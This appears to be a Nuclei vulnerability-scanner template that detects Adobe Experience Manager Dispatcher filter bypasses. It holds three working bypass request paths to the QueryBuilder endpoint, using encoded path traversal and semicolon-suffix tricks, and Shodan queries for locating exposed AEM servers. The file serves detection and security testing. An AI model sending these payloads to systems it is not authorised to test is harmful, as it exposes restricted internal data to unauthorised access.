id: aem-dispatcher-bypass

info:
  name: Adobe Experience Manager - Dispatcher Bypass
  author: DhiyaneshDK,assetnote
  severity: medium
  description: |
    Detected potential Adobe Experience Manager (AEM) Dispatcher misconfigurations that could have allowed bypassing request filtering, exposing internal endpoints, or permitting unauthorised access to restricted resources.
  reference:
    - https://docs.google.com/presentation/d/1PypHgd0r3ZVII7e5fLX5JjZIJQfAsMEydLnug0yFb9k/edit#slide=id.g37d60d13275_0_7
    - https://docs.google.com/presentation/d/1PypHgd0r3ZVII7e5fLX5JjZIJQfAsMEydLnug0yFb9k/edit#slide=id.g38aaa0ee08d_0_20
    - https://docs.google.com/presentation/d/1PypHgd0r3ZVII7e5fLX5JjZIJQfAsMEydLnug0yFb9k/edit#slide=id.g37f32161a1b_0_38
  metadata:
    verified: true
    max-request: 1
    vendor: adobe
    product: experience_manager
    shodan-query:
      - http.title:"aem sign in"
      - http.component:"adobe experience manager"
      - cpe:"cpe:2.3:a:adobe:experience_manager"
  tags: adobe,aem,dispatcher,vuln

http:
  - raw:
      - |
        GET {{paths}} HTTP/1.1
        Host: {{Hostname}}

    payloads:
      paths:
        - "/graphql/execute.json/..%2f../bin/querybuilder.json"
        - "/bin/querybuilder.json;x='x/.ico/y'"
        - "/bin/querybuilder.json;x='x/graphql/execute/json/y'"

    stop-at-first-match: true

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - '"success":true'
          - '"results":'
          - '"hits":'
        condition: and

      - type: status
        status:
          - 200
